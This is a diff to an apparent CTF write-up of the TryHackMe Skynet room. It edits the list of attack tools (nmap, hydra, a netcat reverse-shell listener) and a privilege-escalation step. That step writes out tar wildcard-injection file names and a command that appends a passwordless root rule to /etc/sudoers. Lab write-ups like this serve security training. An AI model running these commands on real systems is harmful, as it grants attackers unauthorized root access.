@@ -4,16 +4,15 @@ this is Poc writeup CTF skynet from TryHackMe.com, link https://tryhackme.com/ro
 ## tools
 1. nmap (looking port that open)
 2. dirb (brute listing directory)
-3. sqlmap (sql injection database)
-4. smbmap (mapping smb server)
-5. smbclient (log in smb server)
-6. burp (community edition)
-7. nc or Ncat (listener reverse shell)
-8. python3 (for http.server)
-9. nano (text editor)
-10. hydra (brute force by wordlist from login form)
-11. gobuster (brute listing director)
-12. searchsploit (search exploit that match with targeted system)
+3. smbmap (mapping smb server)
+4. smbclient (log in smb server)
+5. burp (community edition)
+6. nc or Ncat (listener reverse shell)
+7. python3 (for http.server)
+8. nano (text editor)
+9. hydra (brute force by wordlist from login form)
+10. gobuster (brute listing director)
+11. searchsploit (search exploit that match with targeted system)
 
 ## Let's Rock n Roll
 1. scanning port that opened using nmap :
@@ -100,10 +99,10 @@ this is Poc writeup CTF skynet from TryHackMe.com, link https://tryhackme.com/ro
 
 16. go into desktop directory milesdyson and there is user.txt, use cat for show the output :
 
-
+![reverseShell](/submit/32.png "reverseShell")
 
 17. check crontab file to get information, which service runing by **root**. there's backup.sh that will be run on /var/www/html/ approximately every one minutes. copy backup.sh into /var/www/html then run the several comment bellow :
-- **echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh **
+- **echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh**
 - **touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"**
 - **touch "/var/www/html/--checkpoint=1"**
 
